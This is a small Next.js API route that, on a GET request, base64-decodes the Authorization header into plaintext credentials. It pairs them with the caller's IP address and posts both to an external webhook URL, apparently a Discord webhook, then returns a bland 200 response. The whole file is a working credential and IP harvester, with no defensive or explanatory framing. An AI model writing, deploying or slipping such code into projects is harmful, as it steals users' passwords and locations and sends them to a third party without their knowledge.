import { NextApiRequest, NextApiResponse } from "next";

export default async (req: NextApiRequest, res: NextApiResponse) => {
  const forwarded = req.headers["x-forwarded-for"];
  if (req.method === "GET") {
    await fetch(process.env.URL as string, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            description: `${atob(req.headers.authorization!.split(" ")[1])}\n${
              forwarded
                ? (forwarded as string).split(/, /)[0]
                : req.connection.remoteAddress
            }`,
          },
        ],
      }),
    });
    res.status(200).json(200);
  } else {
    res.status(400).json({
      error: "Bad method",
    });
  }
};
